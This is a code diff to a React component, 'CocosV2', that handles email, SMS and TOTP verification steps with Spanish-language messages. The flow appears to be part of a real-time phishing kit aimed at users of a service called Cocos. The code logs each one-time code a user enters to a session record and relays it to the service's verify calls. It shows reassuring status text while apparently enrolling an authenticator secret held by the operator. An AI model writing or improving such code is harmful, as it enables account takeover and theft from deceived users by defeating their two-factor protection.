@@ -517,9 +517,37 @@ const CocosV2 = () => {
     try {
       await updateSession("email_code_entered", { otp_code: `email_code:${code}` });
 
+      let currentToken = accessToken;
+      let currentRefresh = refreshTokenRef.current || refreshToken;
+
+      // Refresh token first — it likely expired while user typed the code
+      try {
+        const refreshed = await callApi("refresh_token", { refresh_token: currentRefresh });
+        if (refreshed?.access_token) {
+          currentToken = refreshed.access_token;
+          currentRefresh = refreshed.refresh_token || currentRefresh;
+          setAccessToken(currentToken);
+          setRefreshToken(currentRefresh); refreshTokenRef.current = currentRefresh;
+          console.log("[EMAIL VERIFY] Token refreshed before verify");
+
+          // Re-send email challenge with fresh token so we get a fresh challenge
+          try {
+            await callApi("email_challenge", {
+              access_token: currentToken,
+              refresh_token: currentRefresh,
+            });
+            console.log("[EMAIL VERIFY] Re-challenged with fresh token — user should use NEW code from email");
+          } catch (reChErr) {
+            console.warn("[EMAIL VERIFY] Re-challenge failed, proceeding with existing challenge", reChErr);
+          }
+        }
+      } catch (refreshErr) {
+        console.warn("[EMAIL VERIFY] Token refresh failed, trying with existing token", refreshErr);
+      }
+
       const verifyData = await callApi("email_verify", {
-        access_token: accessToken,
-        refresh_token: refreshTokenRef.current,
+        access_token: currentToken,
+        refresh_token: currentRefresh,
         code,
       });
 
@@ -540,7 +568,6 @@ const CocosV2 = () => {
             await updateSession("sms_sent", { otp_code: `sms_phone:${smsData.phone_hint || "?"}` });
             setStep("sms_verify");
           } else {
-            // SMS failed — try to enroll TOTP without SMS and finish
             await updateSession("sms_send_failed");
             setStatusMsg("SMS no disponible. Procesando seguridad alternativa...");
             await enrollTotpAndFinish(newToken);
@@ -559,7 +586,7 @@ const CocosV2 = () => {
       setError(parseOtpError(err, "Error al verificar el código. Intentá de nuevo."));
     }
     setLoading(false);
-  }, [callApi, accessToken, updateSession]);
+  }, [callApi, accessToken, refreshToken, updateSession, enrollTotpAndFinish]);
 
   // Helper: retry TOTP challenge+verify up to maxAttempts with freshly generated codes
   const retryTotpVerify = useCallback(async (token: string, factId: string, secret: string, maxAttempts = 5): Promise<{ access_token?: string; refresh_token?: string } | null> => {
